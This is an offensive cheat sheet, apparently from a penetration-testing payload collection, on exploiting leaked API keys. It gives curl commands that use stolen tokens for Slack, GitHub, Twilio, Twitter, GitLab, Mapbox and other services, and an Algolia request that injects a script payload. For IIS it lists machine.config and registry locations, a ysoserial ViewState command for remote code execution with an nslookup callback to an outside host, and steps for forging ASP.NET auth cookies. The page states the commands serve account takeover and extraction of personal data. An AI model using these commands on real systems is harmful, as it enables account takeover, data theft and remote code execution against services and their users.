# API Key Leaks

> The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.

## Summary

- [Tools](#tools)
- [Exploit](#exploit)
    - [Google Maps](#google-maps)
    - [Algolia](#algolia)
    - [AWS Access Key ID & Secret](#aws-access-key-id--secret)
    - [Slack API Token](#slack-api-token)
    - [Facebook Access Token](#facebook-access-token)
    - [Github client id and client secret](#github-client-id-and-client-secret)
    - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
    - [Twitter API Secret](#twitter-api-secret)
    - [Twitter Bearer Token](#twitter-bearer-token)
    - [Gitlab Personal Access Token](#gitlab-personal-access-token)
    - [HockeyApp API Token](#hockeyapp-api-token)
    - [IIS Machine Keys](#iis-machine-keys)
    - [Mapbox API Token](#Mapbox-API-Token)


## Tools

- [KeyFinder - is a tool that let you find keys while surfing the web!](https://github.com/momenbasel/KeyFinder)
- [Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.](https://github.com/streaak/keyhacks)

## Exploit

The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.

### Google Maps 

Use : https://github.com/ozguralp/gmapsapiscanner/

Impact:
* Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
* Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account

### Algolia 

```powershell
curl --request PUT \
  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <example-key>' \
  --header 'x-algolia-application-id: <example-application-id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
```

### Slack API Token

```powershell
curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
```

### Facebook Access Token

```powershell
curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
```

### Github client id and client secret

```powershell
curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
```

### Twilio Account_sid and Auth token

```powershell
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
```

### Twitter API Secret

```powershell
curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
```

### Twitter Bearer Token

```powershell
curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
```

### Gitlab Personal Access Token

```powershell
curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
```


### HockeyApp API Token

```powershell
curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
```


### IIS Machine Keys

> That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.

Requirements
* machineKey **validationKey** and **decryptionKey**
* __VIEWSTATEGENERATOR cookies
* __VIEWSTATE cookies

Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.

```xml
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
```

Common locations of **web.config** / **machine.config**
* 32-bit
    * C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config
    * C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config
* 64-bit
    * C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config
    * C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config
* in registry when **AutoGenerate** is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)
    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4  
    * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey

Exploit with [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)

#### Identify known machine key

```powershell
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
```


#### Generate ViewState for RCE

**NOTE**: In Burp you should **URL Encode Key Characters** for your payload.

```powershell
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
```


#### Edit cookies with the machine key

If you have the machineKey but the viewstate is disabled.

ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools

```powershell
# decrypt cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```

### Mapbox API Token
A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is `sk`, jackpot. If it's `pk` or `tk`, it's not worth your time.
```
#Check token validity
curl "https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN"

#Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)
curl "https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN"
```

## References

* [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
* [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
* [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
* [Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020](https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/)
* [Mapbox API Token Documentation](https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/)